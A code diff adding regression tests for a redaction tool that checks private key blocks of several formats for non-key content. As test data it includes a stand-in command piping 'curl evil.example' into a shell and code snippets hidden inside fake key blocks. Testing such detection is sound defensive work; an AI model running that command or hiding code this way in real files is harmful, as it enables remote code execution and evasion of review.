@@ -1426,3 +1426,150 @@ def test_patch_context_tie_ranks():
     assert r._more_redacted("[REDACTED:y]", "a [REDACTED:x] b") == "[REDACTED:y]"
     assert r._more_redacted("[REDACTED:x][REDACTED:y]", "[REDACTED:z]") == "[REDACTED:x][REDACTED:y]"
     assert r._more_redacted("same", "same") == "same"
+
+
+# Regression (re-review of the final fixes, GAP1 and R-1): a key block with an
+# END line hid any code as `text-in-private-key-block` while coverage stayed
+# complete, and PuTTY took single tokens such as `evilcmd` as key data. Ruling
+# R-KEYBLOCK: a key block of any format holds key material only (the header
+# lines its format allows, then base64 of one full width, the last line may be
+# shorter), or the file's coverage is unavailable.
+
+SHELL_CODE = ['import os', 'os.system("curl evil.example | sh")']
+TOKENS = ["evilcmd", "VERIFY=0", "/tmp/x", "/tmp/xyz"]
+
+
+def pem_block(body, label="RSA PRIVATE KEY"):
+    return f"-----BEGIN {label}-----\n" + "".join(line + "\n" for line in body) + f"-----END {label}-----\n"
+
+
+def test_terminated_pem_block_that_hides_code_is_unavailable():
+    text = 'x = """-----BEGIN PRIVATE KEY-----\n"""\n' + "\n".join(SHELL_CODE) + '\ny = """\n-----END PRIVATE KEY-----"""\n'
+    out = r.redact_text(text)
+    assert "os.system" not in out
+    assert r.unterminated_private_keys(text) == [1]
+
+
+@pytest.mark.parametrize("token", TOKENS)
+def test_terminated_pem_block_with_one_token_is_unavailable(token):
+    assert r.unterminated_private_keys("# " + pem_block([token])) == [1]
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        pem_body(240, 64, seed=40) + ["evilcmd"],  # a line after the short last line
+        pem_body(240, 64, seed=41)[:2] + ["/tmp/x"] + pem_body(240, 64, seed=41)[2:],  # in the middle
+        pem_body(240, 60, seed=42),  # a width that is not a key width (re-wrapped key)
+        [pem_body(64, 64, seed=43)[0], pem_body(76, 76, seed=44)[0]],  # two widths
+        pem_body(48, 64, seed=45)[:1] + ["AAA"],  # not padded base64
+        ["Comment: exec(open('x').read())"] + pem_body(240, 64, seed=46),  # header with code
+        ["Proc-Type: 4,ENCRYPTED"] + pem_body(240, 64, seed=47) + ["DEK-Info: AES-128-CBC,00FF"],  # header after body
+        pem_body(240, 64, seed=48) + ["=AbCd"],  # PGP checksum outside a PGP block
+    ],
+    ids=["after-last", "middle", "rewrapped", "two-widths", "unpadded", "header-code", "late-header", "checksum"],
+)
+def test_pem_block_that_is_not_key_material_is_unavailable(body):
+    assert r.unterminated_private_keys(pem_block(body)) == [1]
+
+
+def test_one_line_key_in_code_with_code_inside_is_unavailable():
+    text = 'k = "-----BEGIN PRIVATE KEY-----"; os.system("id"); s = "-----END PRIVATE KEY-----"\n'
+    assert r.unterminated_private_keys(text) == [1]
+
+
+@pytest.mark.parametrize("crlf", [False, True])
+@pytest.mark.parametrize(
+    "text",
+    [
+        PRIVATE_KEY + "\n",
+        pem_block(pem_body(1200, 64, seed=50)),
+        pem_block(pem_body(48, 64, seed=51), "PRIVATE KEY"),  # Ed25519: one full line
+        pem_block(pem_body(1600, 70, seed=52), "OPENSSH PRIVATE KEY"),
+        pem_block(["Proc-Type: 4,ENCRYPTED", "DEK-Info: AES-128-CBC,0123456789ABCDEF0123456789ABCDEF", ""] + pem_body(1200, 64, seed=53)),
+        pem_block(["Version: GnuPG v2", "Comment: Alice key, test only", ""] + pem_body(900, 64, seed=54) + ["=AbCd"], "PGP PRIVATE KEY BLOCK"),
+        "---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\nSubject: alice\n"
+        + 'Comment: "rsa-key-20261025"\nx-Command: none\n' + "\n".join(pem_body(900, 72, seed=55)) + "\n---- END SSH2 ENCRYPTED PRIVATE KEY ----\n",
+        # A key in code: quotes, `\n` escapes and concatenation.
+        'KEY = (\n    "-----BEGIN PRIVATE KEY-----\\n"\n' + "".join(f'    "{b}\\n"\n' for b in pem_body(1200, 64, seed=56)) + '    "-----END PRIVATE KEY-----\\n"\n)\n',
+        "const k = '-----BEGIN PRIVATE KEY-----\\n' +\n" + "".join(f"  '{b}\\n' +\n" for b in pem_body(1200, 64, seed=57)) + "  '-----END PRIVATE KEY-----\\n';\n",
+        # A one-line key in JSON (a service account file).
+        '{"private_key": "-----BEGIN PRIVATE KEY-----\\n' + "\\n".join(pem_body(1200, 64, seed=58)) + '\\n-----END PRIVATE KEY-----\\n", "x": 1}\n',
+        # The PR deleted only the BEGIN line.
+        "a = 1\n" + pem_block(pem_body(1200, 64, seed=59)).split("\n", 1)[1],
+        "# no body\n-----BEGIN PRIVATE KEY-----\n-----END PRIVATE KEY-----\n",
+    ],
+    ids=["rsa", "pem", "ed25519", "openssh", "encrypted", "pgp", "ssh2", "py-code", "js-code", "json", "no-begin", "empty"],
+)
+def test_real_key_blocks_are_complete(text, crlf):
+    if crlf:
+        text = text.replace("\n", "\r\n")
+    assert r.unterminated_private_keys(text) == []
+
+
+def test_key_line_starting_with_plus_keeps_its_width():
+    body = ["+" + pem_body(63, 63, seed=60)[0][:63], pem_body(48, 64, seed=61)[0]]
+    assert len(body[0]) == 64
+    assert r.unterminated_private_keys(pem_block(body)) == []
+
+
+@pytest.mark.parametrize("token", TOKENS)
+def test_end_without_begin_that_hides_a_token_is_unavailable(token):
+    text = f"set -e\n{token}\n-----END RSA PRIVATE KEY-----\n"
+    assert r.redact_text(text).split("\n")[1] == "[REDACTED:private-key]"
+    assert r.unterminated_private_keys(text) == [3]
+
+
+@pytest.mark.parametrize(
+    "private",
+    [
+        ["evilcmd", "VERIFY=0", "PATH=/tmp/x"],
+        ["evilcmd"],
+        pem_body(240, 64, seed=62)[:2] + ["/tmp/x"] + pem_body(240, 64, seed=62)[2:],
+        pem_body(240, 70, seed=63),  # PuTTY wraps at 64 only
+    ],
+    ids=["tokens", "one-token", "middle", "width-70"],
+)
+def test_putty_block_that_is_not_key_material_is_unavailable(private):
+    text = putty_file(private)
+    assert all(line not in r.redact_text(text).split("\n") for line in private)
+    assert r.unterminated_private_keys(text) == [6]
+
+
+@pytest.mark.parametrize("nbytes", [36, 37, 61, 600])
+def test_putty_short_last_line_is_complete(nbytes):
+    # Ed25519 (36 bytes, one line of 48), ECDSA, Ed448 (two lines) and RSA.
+    assert r.unterminated_private_keys(putty_file(pem_body(nbytes, 64, seed=64))) == []
+
+
+def b64_key_text(pem: bytes) -> str:
+    return f"data:\n  tls.key: {base64.b64encode(pem).decode()}\n"
+
+
+def test_base64_pem_key_that_hides_code_is_unavailable():
+    pem = b"-----BEGIN PRIVATE KEY-----\nimport os; os.system('id')\n-----END PRIVATE KEY-----\n"
+    text = b64_key_text(pem)
+    assert "[REDACTED:private-key-base64]" in r.redact_text(text)
+    assert r.unterminated_private_keys(text) == [2]
+
+
+def test_base64_pem_key_with_code_after_a_cut_off_block_is_unavailable():
+    pem = b"-----BEGIN PRIVATE KEY-----\n" + "\n".join(pem_body(9000, 64, seed=65)).encode() + b"\nexec(x)\n"
+    assert r.unterminated_private_keys(b64_key_text(pem)) == [2]
+
+
+@pytest.mark.parametrize("prefix", [b"", b"x", b"xy", b"xyz"])
+def test_base64_pem_key_is_complete(prefix):
+    assert r.unterminated_private_keys(b64_key_text(prefix + (PRIVATE_KEY + "\n").encode())) == []
+
+
+def test_base64_wrapped_pem_key_is_complete():
+    token = base64.b64encode((PRIVATE_KEY + "\n").encode()).decode()
+    text = "".join(token[i : i + 76] + "\n" for i in range(0, len(token), 76))
+    assert r.unterminated_private_keys(text) == []
+
+
+def test_key_line_check_is_linear():
+    # A long run of `+` after base64 and before other text must not backtrack.
+    text = "-----BEGIN PRIVATE KEY-----\n" + "A" * 64 + "+" * 200_000 + "x\n-----END PRIVATE KEY-----\n"
+    assert r.unterminated_private_keys(text) == [1]
